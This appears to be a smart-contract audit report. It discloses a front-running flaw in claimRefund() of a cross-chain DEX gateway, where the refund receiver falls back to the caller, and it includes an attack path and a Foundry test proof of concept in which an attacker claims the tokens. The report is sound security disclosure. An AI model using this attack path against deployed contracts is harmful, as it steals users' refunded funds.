# claimRefund() can be frontruned, allowing an attacker to steal the tokens if it is called by a bot.

### Summary

`claimRefund()` is used to return tokens when a cross-chain transaction fails. It can be called either by the initiator of the transaction or by an authorized bot. 

The use of a bot is necessary in cases where the initiator's address is not correctly set in the cross-chain message. In such cases, the refund must be handled manually. However, malicious actor could frontrun the transaction and steal the tokens.


### Root Cause

[claimRefund()](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L590) is implemented as follows.
```solidity
function claimRefund(bytes32 externalId) external {
        RefundInfo storage refundInfo = refundInfos[externalId];

        address receiver = msg.sender;

        if(refundInfo.walletAddress.length == 20) {
            receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        }
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
        require(refundInfo.externalId != "", "REFUND_NOT_EXIST");
        
        TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);
        delete refundInfos[externalId];

        emit EddyCrossChainRefundClaimed(
            externalId,
            refundInfo.token,
            refundInfo.amount,
            abi.encodePacked(msg.sender)
        );
    }
```
As you can see, when `refundInfo.walletAddress.length != 20`, the receiver defaults to `msg.sender`. This fallback is implemented to handle cases where the address is not properly set in the cross-chain message. In such scenarios, an authorized bot is expected to call the function and then manually forward the funds to the intended user.

The issue arises because this logic can be exploited. A malicious user could front-run the transaction and call it before the authorized bot. Since the condition to enter the `if` block is not met, and `msg.sender == receiver` evaluates to true, the transaction succeeds, allowing the attacker to steal the tokens.


### Internal Pre-conditions

Cross-chain transaction fails.

### External Pre-conditions

None.

### Attack Path

1. A cross-chain transaction fails and is recorded in the `refundInfos` mapping.
2. The `refundInfo.walletAddress` is not correctly stored.
3. An authorized bot calls `claimRefund()` to claim the tokens and manually send them to the intended user.
4. A malicious user sees the transaction and front-runs it, successfully stealing the tokens.


### Impact

Malicious users can steal tokens from others, resulting in a loss of funds.


### PoC

To better understand the issue, copy the following POC into `GatewayCrossChain.t.sol`.
```solidity
function test_frontRun_claimRefund() public {
        bytes32 externalId1 = keccak256(abi.encodePacked(block.timestamp));
        token1Z.mint(address(gatewayCrossChain), 2 * initialBalance);

        vm.startPrank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: initialBalance,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId1, "") //the user's address is not correctly set.
            })
        );
        vm.stopPrank();

        address attaker = address(0x123);

        //attacker frontrun the transaction
        vm.prank(attaker);
        gatewayCrossChain.claimRefund(externalId1);

        vm.prank(bot);
        vm.expectRevert();
        gatewayCrossChain.claimRefund(externalId1);
        
        assertEq(token1Z.balanceOf(attaker), initialBalance);
    }
```
